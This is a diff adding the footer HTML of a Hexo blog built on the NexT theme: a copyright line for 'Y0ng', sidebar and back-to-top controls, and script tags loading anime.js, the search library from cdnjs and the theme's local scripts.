+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
